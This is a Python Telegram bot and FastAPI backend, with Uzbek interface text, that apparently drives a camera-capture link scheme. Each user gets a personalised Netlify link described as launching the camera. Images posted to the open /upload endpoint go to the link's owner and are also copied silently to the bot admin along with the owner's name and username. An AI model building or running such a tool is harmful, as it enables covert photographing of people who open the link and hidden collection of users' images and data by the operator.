import base64
from contextlib import asynccontextmanager
import json
import logging
import os
from pathlib import Path
import uuid

from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from telegram import (
    Bot,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardMarkup,
    Update,
)
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID_RAW = os.getenv("ADMIN_ID")

if not TOKEN:
    raise RuntimeError("BOT_TOKEN kiritilmagan!")
if not ADMIN_ID_RAW:
    raise RuntimeError("ADMIN_ID kiritilmagan!")

ADMIN_ID = int(ADMIN_ID_RAW.strip())
NETLIFY_URL = "https://gemini18oytekin.netlify.app"

USERS_FILE = Path("users.json")


def load_users():
    if USERS_FILE.exists():
        try:
            data = json.loads(USERS_FILE.read_text(encoding="utf-8"))
            if isinstance(data, dict):
                return data
            elif isinstance(data, list):
                return {
                    str(u): {"id": u, "first_name": "Foydalanuvchi", "username": "Mavjud emas"}
                    for u in data
                }
        except Exception:
            return {}
    return {}


def save_user(user):
    if not user:
        return
    try:
        users = load_users()
        users[str(user.id)] = {
            "id": user.id,
            "first_name": user.first_name or "Noma'lum",
            "username": f"@{user.username}" if user.username else "Mavjud emas",
        }
        USERS_FILE.write_text(
            json.dumps(users, ensure_ascii=False, indent=2), encoding="utf-8"
        )
    except Exception as e:
        logging.error(f"Foydalanuvchini saqlashda xatolik: {e}")


BROADCAST_STATE = {}

tg_app = Application.builder().token(TOKEN.strip()).build()


# --- /start buyrug'i ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    logging.info(f">>> /start buyrug'i keldi! User ID: {user.id}")
    save_user(user)

    if user.id == ADMIN_ID:
        keyboard = [
            [
                KeyboardButton("📸 Rasmga olish linki"),
                KeyboardButton("📢 Xabar yuborish"),
            ],
            [KeyboardButton("📊 Statistika")],
        ]
        reply_markup = ReplyKeyboardMarkup(
            keyboard, resize_keyboard=True, is_persistent=True
        )
        await update.message.reply_text(
            "👑 **Xush kelibsiz, Admin!**\n\nPastdagi menyudan kerakli bo'limni tanlang:",
            reply_markup=reply_markup,
            parse_mode="Markdown",
        )
    else:
        keyboard = [[KeyboardButton("📸 Rasmga olish linki")]]
        reply_markup = ReplyKeyboardMarkup(
            keyboard, resize_keyboard=True, is_persistent=True
        )
        await update.message.reply_text(
            "Salom! 👋\n\nXizmatdan foydalanish uchun pastdagi **'📸 Rasmga olish linki'** tugmasini bosing.",
            reply_markup=reply_markup,
            parse_mode="Markdown",
        )


# --- Klaviatura tugmalarini qayta ishlash ---
async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    text = update.message.text
    save_user(user)

    # Admin xabar yuborish rejimida bo'lsa
    if user_id == ADMIN_ID and BROADCAST_STATE.get(user_id):
        BROADCAST_STATE[user_id] = False
        users = load_users()
        count = 0
        await update.message.reply_text(
            f"⏳ {len(users)} ta foydalanuvchiga xabar yuborilmoqda..."
        )

        for u_id_str in users.keys():
            try:
                await context.bot.copy_message(
                    chat_id=int(u_id_str),
                    from_chat_id=update.message.chat_id,
                    message_id=update.message.message_id,
                )
                count += 1
            except Exception:
                pass

        await update.message.reply_text(
            f"✅ Xabar {count} ta foydalanuvchiga muvaffaqiyatli yetkazildi!"
        )
        return

    # A) Rasmga olish linki
    if text == "📸 Rasmga olish linki":
        personal_link = f"{NETLIFY_URL}/?uid={user_id}"
        await update.message.reply_text(
            f"👇 **Kamerani ishga tushirish uchun link:**\n\n`{personal_link}`\n\n*(Ustiga bir marta bossangiz nusxalanadi)*",
            parse_mode="Markdown",
        )

    # B) Admin: Batafsil Statistika
    elif text == "📊 Statistika" and user_id == ADMIN_ID:
        users = load_users()
        total = len(users)

        msg = f"📊 **Bot statistikasi:**\n\nJami foydalanuvchilar: `{total}` ta\n\n"
        msg += "👥 **Foydalanuvchilar ro'yxati:**\n"

        if users:
            for idx, (uid_str, uinfo) in enumerate(users.items(), 1):
                name = uinfo.get("first_name", "Noma'lum")
                uname = uinfo.get("username", "Mavjud emas")
                uid = uinfo.get("id", uid_str)

                msg += f"{idx}. **{name}** ({uname})\n"
                msg += f"   🆔 ID: `{uid}`\n"
                msg += f"   🔗 [Profilga o'tish](tg://user?id={uid})\n\n"
        else:
            msg += "Hali foydalanuvchilar saqlanmagan."

        await update.message.reply_text(msg, parse_mode="Markdown")

    # C) Admin: Xabar yuborish
    elif text == "📢 Xabar yuborish" and user_id == ADMIN_ID:
        BROADCAST_STATE[user_id] = True
        await update.message.reply_text(
            "📝 Barcha foydalanuvchilarga yubormoqchi bo'lgan xabaringizni shu yerga kiriting:"
        )


tg_app.add_handler(CommandHandler("start", start))
tg_app.add_handler(
    MessageHandler(filters.TEXT & ~filters.COMMAND, handle_buttons)
)


@asynccontextmanager
async def lifespan(app: FastAPI):
    logging.info(">>> Bot ishga tushmoqda...")
    await tg_app.initialize()
    await tg_app.bot.delete_webhook(drop_pending_updates=True)
    await tg_app.start()
    await tg_app.updater.start_polling()
    logging.info(">>> Bot muvaffaqiyatli polling rejimiga o'tdi!")
    yield
    await tg_app.updater.stop()
    await tg_app.stop()
    await tg_app.shutdown()


app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["POST", "OPTIONS"],
    allow_headers=["*"],
)

bot = Bot(TOKEN.strip())
UPLOADS = Path("uploads")
UPLOADS.mkdir(exist_ok=True)


class Photo(BaseModel):
    uid: int
    image: str


@app.get("/health")
async def health():
    return {"ok": True}


# --- Rasm qabul qilish ---
@app.post("/upload")
async def upload(photo: Photo):
    if photo.uid <= 0:
        raise HTTPException(400, "Invalid user id")

    try:
        header, encoded = photo.image.split(",", 1)
        if not header.startswith("data:image/"):
            raise ValueError
        raw = base64.b64decode(encoded)
    except Exception:
        raise HTTPException(400, "Invalid image")

    if not raw or len(raw) > 10 * 1024 * 1024:
        raise HTTPException(413, "Image too large")

    path = UPLOADS / f"{uuid.uuid4().hex}.jpg"
    path.write_bytes(raw)

    bot_info = await bot.get_me()
    bot_link = f"https://t.me/{bot_info.username}"

    # Foydalanuvchi ma'lumotlarini bazadan olish
    users = load_users()
    uinfo = users.get(str(photo.uid), {})
    fname = uinfo.get("first_name", "Noma'lum")
    uname = uinfo.get("username", "Mavjud emas")

    try:
        # Foydalanuvchiga rasm
        user_keyboard = InlineKeyboardMarkup(
            [[InlineKeyboardButton("🤖 Botga qaytish", url=bot_link)]]
        )
        try:
            with path.open("rb") as f:
                await bot.send_photo(
                    chat_id=photo.uid,
                    photo=f,
                    caption="✅ Suratingiz qabul qilindi!",
                    reply_markup=user_keyboard,
                )
        except Exception:
            pass  # Agar user botni bloklagan bo'lsa ham adminga rasm boradi

        # Adminga rasm (Batafsil ma'lumotlar bilan)
        admin_keyboard = InlineKeyboardMarkup(
            [[
                InlineKeyboardButton(
                    "👤 Foydalanuvchi profili", tg_user_id=photo.uid
                )
            ]]
        )
        caption_text = (
            f"📥 **Yangi rasm keldi!**\n\n"
            f"👤 **Ismi:** {fname}\n"
            f"🏷 **User:** {uname}\n"
            f"🆔 **User ID:** `{photo.uid}`"
        )
        with path.open("rb") as f:
            await bot.send_photo(
                chat_id=ADMIN_ID,
                photo=f,
                caption=caption_text,
                parse_mode="Markdown",
                reply_markup=admin_keyboard,
            )

    finally:
        path.unlink(missing_ok=True)

    return {"ok": True}
